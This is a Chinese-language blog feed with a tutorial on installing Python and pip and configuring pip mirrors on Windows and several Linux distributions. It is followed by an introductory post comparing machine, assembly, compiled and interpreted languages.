        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><blockquote><p>python版本不要太新 , 最好3.8即可</p></blockquote></blockquote><h2 id="1-windows安装python"><a href="#1-windows安装python" class="headerlink" title="1.windows安装python"></a>1.windows安装python</h2><h3 id="1-1安装python3"><a href="#1-1安装python3" class="headerlink" title="1.1安装python3"></a>1.1安装python3</h3><p>官网下载地址 : <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154252515.png" alt="image-20211023154252515"></p><p>当前python3最先版本已经是python3.10了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154747679.png" alt="image-20211023154747679"></p><p>然后下载完成就是双击安装下一步 , 下一步 , <code>记住你的安装目录</code> , 因为后面添加环境变量会用到 , 不推荐默认安装在c盘</p><p>补充 : 如果你没有科学上网 , 可能会下载的很慢 , 可以去镜像站下载安装包 , 然后是一样的步骤安装</p><p>地址 : <a href="http://npm.taobao.org/mirrors/python/3.9.7/">http://npm.taobao.org/mirrors/python/3.9.7/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023155058523.png" alt="image-20211023155058523"></p><h3 id="1-2安装python2"><a href="#1-2安装python2" class="headerlink" title="1.2安装python2"></a>1.2安装python2</h3><p>关于python2的安装实际上和python3一样 , 只不过下载的安装包不一样</p><p>官网 : <a href="https://www.python.org/downloads/release/python-2718/">https://www.python.org/downloads/release/python-2718/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023154638480.png" alt="image-20211023154638480"></p><p>镜像站 : <a href="http://npm.taobao.org/mirrors/python/2.7.9/">http://npm.taobao.org/mirrors/python/2.7.9/</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/SI8v2hOVlKxupij.png" alt="image-20211023155247104"></p><h3 id="1-3添加环境变量"><a href="#1-3添加环境变量" class="headerlink" title="1.3添加环境变量"></a>1.3添加环境变量</h3><p>就是把python的<code>安装目录</code>和<code>Script目录</code>添加到<code>path</code>这个系统变量 , 这里为了区分python2和python3 , 可以这样操作</p><p>先把各个版本的<code>python.exe</code>复制然后重命名为<code>python2.exe</code>和<code>python3.exe</code></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/lyS3U1KIHBLkc6r.png" alt="image-20211023160143061"></p><p>按下<code>win</code>键 , 输入环境变量</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172337044.png" alt="image-20211023172337044"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172552047.png" alt="image-20211023172552047"></p><p>然后一路确定就ok了</p><p>验证 :</p><p>win + r , 输入 cmd , 回车 , 输入python2和python3 , 出现下面显示就表示环境变量已经配置好了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023172738216.png" alt="image-20211023172738216"></p><p>这里解释一下环境变量，如果你想运行python解释器，那是不是先要找到python解释器的安装目录，然后进入到</p><p>该目录下，输入python，即可运行python.exe这个可执行文件，但是如果我们每次都这样运行的话，岂不是很费</p><p>事，先找目录，然后才能运行。但是如果你在环境变量中配置了python.exe 的路径，那么你就可以在任意目录</p><p>下，直接输入python，然后就能执行python.exe文件了。这就是为什么要安装环境变量。</p><h2 id="2-centos安装python"><a href="#2-centos安装python" class="headerlink" title="2.centos安装python"></a>2.centos安装python</h2><p>如果原系统已经存在python3了 , 但是是老版本的 , 你可以先先卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove python3</span><br></pre></td></tr></table></figure><p>手动安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）前往用户根目录</span><br><span class="line">cd ~</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）安装依赖包</span><br><span class="line">yum install gcc openssl-devel bzip2-devel libffi-devel -y</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）下载并解压安装包</span><br><span class="line">curl -O https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.0</span>/Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line">注：不同的版本修改版本号<span class="number">3.9</span><span class="number">.0</span>即可 , 如果下载过慢 ,也可以使用镜像站</span><br><span class="line">wget http://npm.taobao.org/mirrors/python/<span class="number">3.9</span><span class="number">.0</span>/Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line">    </span><br><span class="line">tar -zxvf Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）进入目标文件</span><br><span class="line">cd Python-<span class="number">3.9</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>）配置安装路径：/usr/local/python3</span><br><span class="line">./configure prefix=/usr/local/python3</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>）编译并安装</span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>）建立软连接：终端命令 python3，pip3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/python3 /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/pip3 /usr/<span class="built_in">bin</span>/pip3</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>) 验证</span><br><span class="line">python3 --version</span><br><span class="line">pip3 --version</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>）删除安装包与文件：</span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.0</span></span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br></pre></td></tr></table></figure><h2 id="3-ubuntu安装python"><a href="#3-ubuntu安装python" class="headerlink" title="3.ubuntu安装python"></a>3.ubuntu安装python</h2><p>ubuntu默认是安装python2和python3的 , 但是如果你的ubuntu发行版本过低导致你需要的python3版本太低 , 可能不满足你的需求 , 那么怎么安装新版本的python3呢?或者怎么升级python3?</p><p><strong>千万不要卸载ubuntu 桌面版自带的python版本</strong>，否则会开不了机。</p><p>安装方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、使用Apt-Get安装Python <span class="number">3.9</span></span><br><span class="line">Apt软件包管理器提供了在Ubuntu系统上安装Python <span class="number">3.9</span>的简单方法。请按照以下步骤操作：</span><br><span class="line">打开系统上的终端，然后为系统配置Deadsnakes PPA。</span><br><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>在Ubuntu系统上添加ppa后，更新apt缓存并在Ubuntu上安装Python <span class="number">3.9</span>。</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3<span class="number">.9</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>等待安装完成。通过执行以下命令检查Python版本：</span><br><span class="line">python3<span class="number">.9</span> -V</span><br><span class="line">至此，Python <span class="number">3.9</span>已安装在Ubuntu系统上并可以使用。</span><br><span class="line"></span><br><span class="line">修改软连接 , 不是很推荐就用python3<span class="number">.9</span>吧</span><br><span class="line">sudo rm /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">sudo ln -s python3<span class="number">.7</span> python3</span><br></pre></td></tr></table></figure><p>但是默认是没有pip3指向python3.9的 , 解决办法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装pip3-&gt;python3<span class="number">.9</span></span><br><span class="line"><span class="comment"># 安装pip3 </span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py  //下载安装脚本。</span><br><span class="line">python3<span class="number">.9</span> get-pip.py  //执行安装脚本</span><br><span class="line">如果报错 ,  ModuleNotFoundError: No module named <span class="string">&#x27;distutils.cmd&#x27;</span></span><br><span class="line">sudo apt-get install python3-distutils</span><br><span class="line">sudo cp -r /usr/lib/python3<span class="number">.6</span>/distutils /usr/lib/python3<span class="number">.9</span>/</span><br><span class="line">然后再执行</span><br><span class="line">python3<span class="number">.9</span> get-pip.py</span><br><span class="line"></span><br><span class="line">pip3<span class="number">.9</span> -V  //查看当前pip3的版本</span><br><span class="line"></span><br><span class="line">ubuntu  python版本推荐方案 : 安装python3<span class="number">.9</span> , 然后安装pip3-&gt;python3<span class="number">.9</span></span><br></pre></td></tr></table></figure><p>补充 :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali虽然默认已经安装了python2和最先版本的python3 , 但是没有区分pip2和pip3</span><br><span class="line"></span><br><span class="line">解决方法</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装pip2</span></span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py   //下载安装脚本。基于当前python2的具体版本</span><br><span class="line">python2 get-pip.py            // 执行脚本</span><br><span class="line">pip2 -V                              //查看当前pip2的版本</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装pip3 ( 两个不要在一个目录下 )</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py  //下载安装脚本。</span><br><span class="line">python3 get-pip.py  //执行安装脚本</span><br><span class="line">pip3 -V  //查看当前pip3的版本</span><br></pre></td></tr></table></figure><h2 id="4-pip换源"><a href="#4-pip换源" class="headerlink" title="4.pip换源"></a>4.pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip  pip.exe  python的包管理工具 , 通过它可以下载安装一下第三方库</span><br><span class="line">pip3 install xxx</span><br><span class="line">npm</span><br><span class="line">apt</span><br><span class="line">yum</span><br><span class="line">brew</span><br></pre></td></tr></table></figure><h3 id="4-1windows-pip换源"><a href="#4-1windows-pip换源" class="headerlink" title="4.1windows pip换源"></a>4.1windows pip换源</h3><p>1.在运行窗口( <code>win + R</code> )中输入**%APPDATA%**</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175122121.png" alt="image-20211023175122121"></p><p>2.进入目录后，新建一个文件夹<strong>pip</strong>，并在该文件夹里面新建文件<strong>pip.ini</strong>，并输入以下内容：</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175153352.png" alt="image-20211023175153352"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175229500.png" alt="image-20211023175229500"></p><p><strong>pip.ini文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p>或者豆瓣源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=http://pypi.douban.com/simple</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><h3 id="4-2-linux-pip换源"><a href="#4-2-linux-pip换源" class="headerlink" title="4.2 linux pip换源"></a>4.2 linux pip换源</h3><p>无论是那种linux发行版本 , 换源的方法都一样</p><p>配置pip源，提高下载速度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip &amp;&amp; touch ~/.pip/pip.conf</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=http://pypi.douban.com/simple</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><p>linux系统可能需要重启生效</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0.你应该知道的编程语言和python介绍</title>
      <link href="/2022/09/19/Python/0.%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%92%8Cpython%E4%BB%8B%E7%BB%8D/"/>
      <url>/2022/09/19/Python/0.%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%92%8Cpython%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-编程语言的分类"><a href="#1-编程语言的分类" class="headerlink" title="1. 编程语言的分类"></a>1. 编程语言的分类</h2><h3 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a>1.1 机器语言</h3><p>机器语言是站在计算机(奴隶)的角度，说计算机能听懂&#x2F;理解的语言，而计算机能直接理解的就是二进制指令，所</p><p>以机器语言就是直接用二进制编程，这意味着机器语言是直接操作硬件的，因此机器语言属于低级语言，此处的低</p><p>级指的是底层、贴近计算机硬件（贴近代指需要详细了解计算机硬件细节、直接控制硬件），详解如下 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#机器语言</span></span><br><span class="line">    用二进制代码<span class="number">0</span>和<span class="number">1</span>描述的指令称为机器指令，由于计算机内部是基于二进制指令工作的，所以机器语言是直接控制计算机硬件。</span><br><span class="line"></span><br><span class="line">    用机器语言编写程序，编程人员要首先熟记所用计算机的全部指令代码以及代码的含义，然后在编写程序时，程序员得自己处理每条指令和每一数据的存储分配和输入输出，还得记住编程过程中每步所使用的工作单元处在何种状态。这是一件十分繁琐的工作。编写程序花费的时间往往是实际运行时间的几十倍或几百倍。而且，编出的程序全是些<span class="number">0</span>和<span class="number">1</span>的指令代码，直观性差，不便阅读和书写，还容易出错，且依赖于具体的计算机硬件型号，局限性很大。除了计算机生产厂家的专业人员外，绝大多数的程序员已经不再去学习机器语言了。</span><br><span class="line"></span><br><span class="line">    机器语言是被微处理器理解和使用的，存在有多至<span class="number">100000</span>种机器语言的指令，下述是一些简单示例</span><br><span class="line"></span><br><span class="line">    <span class="comment">#指令部份的示例</span></span><br><span class="line">    <span class="number">0000</span> 代表 加载（LOAD）</span><br><span class="line">    0001 代表 存储（STORE）</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">#暂存器部份的示例</span></span><br><span class="line">    <span class="number">0000</span> 代表暂存器 A</span><br><span class="line">    0001 代表暂存器 B</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">#存储器部份的示例</span></span><br><span class="line">    <span class="number">000000000000</span> 代表地址为 <span class="number">0</span> 的存储器</span><br><span class="line">    000000000001 代表地址为 <span class="number">1</span> 的存储器</span><br><span class="line">    <span class="number">0000000</span>10000 代表地址为 <span class="number">16</span> 的存储器</span><br><span class="line">    <span class="number">100000000000</span> 代表地址为 <span class="number">2</span>^<span class="number">11</span> 的存储器</span><br><span class="line"></span><br><span class="line">    <span class="comment">#集成示例</span></span><br><span class="line">    <span class="number">0000</span>,<span class="number">0000</span>,<span class="number">0000000</span>10000 代表 LOAD A, <span class="number">16</span></span><br><span class="line">    <span class="number">0000</span>,0001,000000000001 代表 LOAD B, <span class="number">1</span></span><br><span class="line">    0001,0001,<span class="number">0000000</span>10000 代表 STORE B, <span class="number">16</span></span><br><span class="line">    0001,0001,000000000001 代表 STORE B, <span class="number">1</span>[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><strong>机器语言的特点 :</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率最高</span></span><br><span class="line">编写的程序可以被计算机无障碍理解、直接运行，执行效率高 。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率最低</span></span><br><span class="line">复杂，开发效率低</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">贴近/依赖具体的硬件，跨平台性差,他是直接控制cpu执行，</span><br><span class="line">那么不同平台上的计算机硬件中的cpu型号可能不同</span><br></pre></td></tr></table></figure><h3 id="1-2-汇编语言"><a href="#1-2-汇编语言" class="headerlink" title="1.2 汇编语言"></a>1.2 汇编语言</h3><p>汇编语言仅仅是用一个英文标签代表一组二进制指令( 之间是映射关系)，毫无疑问，比起机器语言，汇编语言是</p><p>一种进步，但汇编语言的本质仍然是直接操作硬件，因此汇编语言仍是比较低级&#x2F;底层的语言、贴近计算机硬件 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#汇编语言</span></span><br><span class="line">汇编语言的实质和机器语言是相同的，都是直接对硬件操作，只不过指令采用了英文缩写的标识符，更容易识别和记忆。它同样需要编程者将每一步具体的操作用命令的形式写出来。汇编程序的每一句指令只能对应实际操作过程中的一个很细微的动作。例如移动、自增，因此汇编源程序一般比较冗长、复杂、容易出错，而且使用汇编语言编程需要有更多的计算机专业知识，但汇编语言的优点也是显而易见的，用汇编语言所能完成的操作不是一般高级语言所能够实现的，而且源程序经汇编生成的可执行文件不仅比较小，而且执行速度很快。</span><br><span class="line"></span><br><span class="line">汇编的hello world，打印一句hello world, 需要写十多行，如下</span><br><span class="line"></span><br><span class="line">; hello.asm </span><br><span class="line">section.data            ; 数据段声明</span><br><span class="line">        msg db <span class="string">&quot;Hello, world!&quot;</span>, <span class="number">0xA</span>     ; 要输出的字符串</span><br><span class="line">        <span class="built_in">len</span> equ $ - msg                 ; 字串长度</span><br><span class="line">        section .text            ; 代码段声明</span><br><span class="line">        <span class="keyword">global</span> _start            ; 指定入口函数</span><br><span class="line">        _start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, <span class="built_in">len</span>     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, <span class="number">1</span>       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, <span class="number">4</span>       ; 系统调用号(sys_write) </span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span>         ; 调用内核功能</span><br><span class="line">                               ; 退出程序</span><br><span class="line">        mov ebx, <span class="number">0</span>       ; 参数一：退出代码</span><br><span class="line">        mov eax, <span class="number">1</span>       ; 系统调用号(sys_exit) </span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span>         ; 调用内核功能</span><br></pre></td></tr></table></figure><p><strong>汇编语言的特点</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率高</span></span><br><span class="line">相对于机器语言，使用英文标签编写程序相对简单，执行效率高，</span><br><span class="line">但较之机器语言稍低，</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率低：</span></span><br><span class="line">仍然是直接操作硬件，比起机器语言来说，复杂度稍低，</span><br><span class="line">但依旧居高不下，所以开发效率依旧较低</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">同样依赖具体的硬件，跨平台性差</span><br></pre></td></tr></table></figure><h3 id="1-3-高级语言"><a href="#1-3-高级语言" class="headerlink" title="1.3 高级语言"></a>1.3 高级语言</h3><h4 id="1-3-1-编译型语言"><a href="#1-3-1-编译型语言" class="headerlink" title="1.3.1 编译型语言"></a>1.3.1 编译型语言</h4><p>编译型语言是指程序在执行之前需要一个专门的编译过程，把程序源文件编译为机器语言的文件，运行时不需要重</p><p>新编译，执行效率高，但缺点是，编译型语言依赖编译器，跨平台性差。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率高</span></span><br><span class="line">编译是指在应用源程序执行之前，就将程序源代码“翻译”成目标代码（即机器语言），</span><br><span class="line">因此其目标程序可以脱离其语言环境独立执行，使用比较方便，执行效率较高。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率低：</span></span><br><span class="line">应用程序一旦需要修改，必须先修改源代码，然后重新编译、生成新的目标文件才能执行，</span><br><span class="line">而在只有目标文件而没有源代码，修改会很不方便。所以开发效率低于解释型</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">编译型代码是针对某一个平台翻译的，当前平台翻译的结果无法拿到不同的平台使用，</span><br><span class="line">针对不同的平台必须重新编译，即跨平台性差</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他</span></span><br><span class="line">现在大多数的编程语言都是编译型的。</span><br><span class="line">编译程序将源程序翻译成目标程序后保存在另一个文件中，</span><br><span class="line">该目标程序可脱离编译程序直接在计算机上多次运行。</span><br><span class="line">大多数软件产品都是以目标程序形式发行给用户的，</span><br><span class="line">不仅便于直接运行，同时又使他人难于盗用其中的技术。</span><br><span class="line">C、C++、Ada、Pascal都是编译实现的  go</span><br></pre></td></tr></table></figure><h4 id="1-3-2-解释型语言"><a href="#1-3-2-解释型语言" class="headerlink" title="1.3.2 解释型语言"></a>1.3.2 解释型语言</h4><p>解释型语言不能直接翻译成机器语言，而是先翻译成中间代码 （只与解释器有关，和平台无关），再由解释器对</p><p>中间代码进行解释运行 ，而且代码的每次运行，都要有解释器的参与，而且是逐行解释，相对于编译性语言执行</p><p>效率偏慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率低</span></span><br><span class="line">解释型语言的实现中，解释器并不产生目标机器代码，而是产生易于执行的中间代码。</span><br><span class="line">这种中间代码与机器代码是不同的，中间代码的解释是由软件支持的，不能直接使用硬件，</span><br><span class="line">软件解释器通常会导致执行效率较低。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率高</span></span><br><span class="line">用解释型语言编写的程序是由另一个可以理解中间代码的解释程序执行的，与编译程序不同的是，</span><br><span class="line">解释程序的任务是逐一将源程序的语句解释成可执行的机器指令，不需要将源程序翻译成目标代码再执行。</span><br><span class="line">解释程序的优点是当语句出现语法错误时，可以立即引起程序员的注意，而程序员在程序开发期间就能进行校正。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性强</span></span><br><span class="line">代码运行是依赖于解释器，不同平台有对应版本的解释器，所以解释型的跨平台性强</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他</span></span><br><span class="line">对于解释型Basic语言，需要一个专门的解释器解释执行Basic程序，每条语句只有在执行时才被翻译，</span><br><span class="line">这种解释型语言每执行一次就翻译一次，因而效率低下。一般地，动态语言都是解释型的，</span><br><span class="line">例如：Tcl、Perl , VBScript、Ruby , JavaScript，php, python等</span><br></pre></td></tr></table></figure><p>总结：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、执行效率：机器语言&gt;汇编语言&gt;高级语言（编译型&gt;解释型）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2、开发效率：机器语言&lt;汇编语言&lt;高级语言（编译型&lt;解释型）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3、跨平台性：解释型具有极强的跨平台型</span></span><br></pre></td></tr></table></figure><p><strong>关于java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有人说Java是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就无法执行。 也有人说Java是解释型的。因为java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释型的。</span><br><span class="line"></span><br><span class="line">对于C和C++，它们经过一次编译之后，可以由操作系统直接执行，所以它们是编译型语言。而Java不一样，它首先由编译器编译成.class（字节码）文件，然后在通过JVM从.class文件中读一行解释执行一行，所以它是解释型的语言。也正是由于java对于多种不同的操作系统有不同的JVM，所以实现了真正意义上的跨平台。</span><br><span class="line"></span><br><span class="line">所以Java的执行经历了编译和解释的过程，是一种先编译，后解释执行的语言，不可以单纯归到编译性或者解释性语言的类别中。</span><br></pre></td></tr></table></figure><h2 id="2-python语言"><a href="#2-python语言" class="headerlink" title="2. python语言"></a>2. python语言</h2><p>先看一下现在python语言的流行程度，排名还是不错的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.tiobe.com/tiobe-index/</span><br></pre></td></tr></table></figure><p><img 